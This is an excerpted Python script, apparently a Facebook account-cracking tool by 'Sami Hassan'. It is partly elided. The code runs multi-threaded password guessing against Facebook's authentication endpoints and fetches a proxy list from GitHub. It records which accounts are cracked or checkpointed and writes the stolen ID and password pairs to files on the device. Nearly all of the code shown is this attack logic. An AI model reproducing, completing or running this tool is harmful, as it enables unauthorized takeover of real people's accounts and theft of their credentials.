#Open Source By Sami Hassan
# Please Follow My github samimhassan
...
print('\n\033[1;32m   Follow My Facebook ');time.sleep(1)
os.system("xdg-open https://www.facebook.com/sta.samim33")
print('\n\033[1;36m   WELCOME TO SAMI HASSAN TOOLS...');time.sleep(3)
...
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLISAMI/main/.prox.txt').text
...
----------------------------------------------
:AUTHER      : SAMI HASSAN
:Facebook    : sta.samim33
:Tool Name  : RANDOM AND FILE
:FRIEND        : WAQAS DILSOZ
Tools Type   : PAID BUT NOW FREE
--------------------------------------------
 VERSION : 1.0
--------------------------------------------"""
def linex():
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ SAMI-OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × SAMI-CP.txt")
                                        print("\033[1;32m [+] I AM SAMI HAAN  ")
                                        print('\033[1;97m [+]-------------------------------------------------------')
...
def pak():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print("\033[1;32m [+] OK IDZ SAVE ✓ SAMI-OK.txt")
                        print("\033[1;32m [+] CP IDZ SAVE × SAMI-CP.txt")
                        print("\033[1;32m [+] I AM SAMI HASSAN ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
...
def afgan():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ SAMI-OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × SAMI-CP.txt")
                        print("\033[1;97m [+]\033[1;32m I AM SAMI HASSAN ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SAMI-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                print('\r\r\033[1;32m [SAMI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SAMI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMI-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SAMI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMI-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SAMI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SAMI-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/SAMI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SAMI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAMI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
